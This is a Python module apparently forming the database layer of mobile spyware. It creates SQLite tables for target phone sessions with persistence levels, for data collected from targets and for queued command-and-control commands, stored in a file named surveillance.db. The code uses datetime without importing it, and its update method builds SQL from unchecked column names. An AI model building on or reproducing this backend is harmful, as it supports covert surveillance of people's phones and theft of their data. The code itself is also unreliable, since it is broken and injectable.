import sqlite3
import json
import os
from contextlib import contextmanager
from core.config_manager import ConfigManager

class DatabaseManager:
    def __init__(self, config_manager: ConfigManager):
        self.config = config_manager
        self.db_path = self.config.get('database.path', 'data/surveillance.db')

    @contextmanager
    def _get_connection(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        yield conn
        conn.close()

    def initialize(self):
        if not os.path.exists(os.path.dirname(self.db_path)):
            os.makedirs(os.path.dirname(self.db_path), exist_ok=True)

    def create_tables(self):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY,
                target_phone TEXT,
                target_os TEXT,
                target_app TEXT,
                status TEXT,
                persistence_level TEXT,
                created_at TEXT,
                metadata TEXT
            )
            ''')

            cursor.execute('''
            CREATE TABLE IF NOT EXISTS collected_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                data_type TEXT,
                payload TEXT,
                timestamp TEXT,
                metadata TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
            ''')

            cursor.execute('''
            CREATE TABLE IF NOT EXISTS c2_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                command TEXT,
                status TEXT,
                created_at TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
            ''')
            
            conn.commit()

    def insert_session(self, session_data: dict):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO sessions (session_id, target_phone, target_os, target_app, status, persistence_level, created_at, metadata)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                session_data['session_id'],
                session_data['target_phone'],
                session_data['target_os'],
                session_data['target_app'],
                session_data['status'],
                session_data.get('persistence_level'),
                session_data['created_at'],
                json.dumps({k:v for k,v in session_data.items() if k not in ['session_id', 'created_at']})
            ))
            conn.commit()

    def update_session(self, session_id: str, updates: dict):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            set_clause = ", ".join([f"{k} = ?" for k in updates.keys()])
            values = list(updates.values()) + [session_id]
            cursor.execute(f"UPDATE sessions SET {set_clause} WHERE session_id = ?", values)
            conn.commit()

    def get_session(self, session_id: str):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,))
            return dict(cursor.fetchone())

    def get_active_sessions(self) -> list:
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM sessions WHERE status = 'active'")
            return [dict(row) for row in cursor.fetchall()]

    def insert_collected_data(self, session_id: str, data_type: str, payload: str, metadata: dict = None):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO collected_data (session_id, data_type, payload, timestamp, metadata)
                VALUES (?, ?, ?, ?, ?)
            ''', (session_id, data_type, payload, datetime.datetime.now().isoformat(), json.dumps(metadata or {})))
            conn.commit()

    def get_collected_data(self, session_id: str, data_type: str = None):
        with self._get_connection() as conn:
            cursor = conn.cursor()
            if data_type:
                cursor.execute("SELECT * FROM collected_data WHERE session_id = ? AND data_type = ?", (session_id, data_type))
            else:
                cursor.execute("SELECT * FROM collected_data WHERE session_id = ?", (session_id,))
            return [dict(row) for row in cursor.fetchall()]